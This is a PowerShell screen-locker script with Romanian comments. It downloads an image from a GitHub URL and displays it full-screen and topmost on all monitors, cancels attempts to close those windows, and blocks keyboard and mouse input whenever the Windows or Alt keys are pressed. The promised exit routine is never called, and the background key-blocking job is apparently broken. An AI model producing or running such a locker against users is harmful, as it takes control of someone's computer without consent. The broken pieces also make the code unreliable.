# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

# Importă funcționalități din user32.dll pentru blocarea tastelor
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Interceptor {
    [DllImport("user32.dll")]
    public static extern int BlockInput(bool block);
}
"@

# Blochează tastatura și mouse-ul
function Block-Input {
    [Interceptor]::BlockInput($true)
}

# Deblochează tastatura și mouse-ul
function Unblock-Input {
    [Interceptor]::BlockInput($false)
}

# Descărcare imagine
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Afișare imagine pe toate monitoarele
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $screens = [System.Windows.Forms.Screen]::AllScreens
    $forms = @()

    foreach ($screen in $screens) {
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Maximized'
        $form.FormBorderStyle = 'None'
        $form.TopMost = $true
        $form.StartPosition = 'Manual'
        $form.Location = $screen.Bounds.Location
        $form.Size = $screen.Bounds.Size

        try {
            $img = [System.Drawing.Image]::FromFile($tempImagePath)
        } catch {
            Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
            exit
        }

        $pictureBox = New-Object System.Windows.Forms.PictureBox
        $pictureBox.Image = $img
        $pictureBox.Dock = 'Fill'
        $pictureBox.SizeMode = 'StretchImage'
        $form.Controls.Add($pictureBox)

        # Protejează împotriva închiderii accidentale
        $form.Add_FormClosing({
            param($sender, $eventArgs)
            if (-not $global:exitFlag) {
                $eventArgs.Cancel = $true
            }
        })

        $forms += $form
    }

    # Rulează formularele pe toate monitoarele
    foreach ($form in $forms) {
        [void]$form.Show()
    }

    [System.Windows.Forms.Application]::Run()
}

# Funcție pentru oprirea completă a aplicației (folosind `cdr`)
function Stop-All {
    $global:exitFlag = $true
    Unblock-Input
    Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
    exit
}

# Monitorizare și blocare taste
function Monitor-And-Block {
    while ($true) {
        Start-Sleep -Milliseconds 100
        if ([System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftWindows) -or
            [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightWindows) -or
            [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftAlt) -or
            [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightAlt)) {
            Block-Input
            Start-Sleep -Milliseconds 100
            Unblock-Input
        }
    }
}

# Pornire aplicație principală
Download-Image
Start-Job -ScriptBlock { Monitor-And-Block }
Show-FullScreenImage
